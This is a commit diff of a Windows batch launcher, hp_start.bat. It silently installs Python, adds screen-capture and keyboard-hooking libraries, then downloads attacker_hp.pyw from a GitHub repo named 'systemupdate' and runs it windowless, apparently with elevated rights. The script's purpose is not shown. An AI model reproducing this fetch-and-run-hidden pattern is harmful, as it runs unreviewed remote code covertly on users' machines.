d7d20c8a9941fe24d758d286d146512d4314720a
blacknut0319-del <blacknut0319@gmail.com>
2026-06-20 14:14:06 +0900

    update hp_start

--- hp_start.bat
+++ hp_start.bat
@@ -13,27 +13,15 @@ if '%errorlevel%' NEQ '0' (
 )
 pushd "%~dp0"
 
-py -3.11 --version >nul 2>&1
-if %errorlevel% neq 0 (
-    curl -o py311_installer.exe https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe
-    if exist py311_installer.exe (
-        start /wait py311_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
-        del py311_installer.exe
-    ) else (
-        pause
-        exit /b
-    )
-)
+where python >nul 2>&1 || where py >nul 2>&1 || (curl -o pyinst.exe https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe && start /wait pyinst.exe /quiet InstallAllUsers=1 PrependPath=1 && del pyinst.exe)
+for %%d in ("C:\Program Files\Python311" "%LocalAppData%\Programs\Python\Python311") do if exist %%d\python.exe set PATH=%%d\Scripts\;%%d\;%PATH%
 
-set PATH=C:\Program Files\Python311\Scripts\;C:\Program Files\Python311\;%PATH%
-set PATH=%LocalAppData%\Programs\Python\Python311\Scripts\;%LocalAppData%\Programs\Python\Python311\;%PATH%
-
-py -3.11 -m pip install --upgrade pip --quiet
-py -3.11 -m pip install numpy pillow mss keyboard --quiet
+python -m pip install --upgrade pip --quiet
+python -m pip install numpy pillow mss keyboard --quiet
 
 curl -L -o "%~dp0attacker_hp.pyw" "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/attacker_hp.pyw?t=%RANDOM%"
 
-for /f "tokens=*" %%i in ('py -3.11 -c "import os, sys; print(os.path.join(os.path.dirname(sys.executable), 'pythonw.exe'))"') do set PW=%%i
+for /f "tokens=*" %%i in ('python -c "import os, sys; print(os.path.join(os.path.dirname(sys.executable), 'pythonw.exe'))"') do set PW=%%i
 start "" "%PW%" "%~dp0attacker_hp.pyw"
 
 exit
